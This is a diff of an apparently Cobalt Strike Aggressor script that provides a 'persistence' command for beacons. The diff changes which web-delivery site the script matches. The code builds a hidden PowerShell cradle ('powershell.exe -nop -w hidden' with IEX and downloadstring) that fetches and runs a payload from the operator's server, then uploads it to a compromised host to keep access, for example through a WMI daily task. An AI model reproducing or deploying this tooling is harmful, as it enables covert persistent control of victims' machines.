@@ -6,6 +6,7 @@
 
 alias persistence {
     if (checkPSpayload($1)){
+    #if (powershell($1)){
 
 ########### Add Menu #############
         if ($2 eq "Add"){
@@ -94,14 +95,14 @@ alias persistence {
 ########### Subroutines #############
 sub checkPSpayload{
     foreach $site (sites()) {
-       if ($site['Description'] eq "PowerShell Web Delivery"){
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
            return true;
        }
     }
 }
 sub uploadPSpayload {
     foreach $site (sites()) {
-       if ($site['Description'] eq "PowerShell Web Delivery"){
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
            $downloadstring = "http://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
            $data = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
            bupload_raw($1, $payloadPath, $data);
@@ -463,8 +464,8 @@ sub remWMIDaily {
 
 ##### Help Menu ######
 beacon_command_register(
-    "persistence", 
-    "add or remove persistence capabilities to a beacon", 
+    "persistence",
+    "add or remove persistence capabilities to a beacon",
     "add or remove persistence capabilities to a beacon
 
 Usage: persistence [Add | Remove] [method] [arguments]
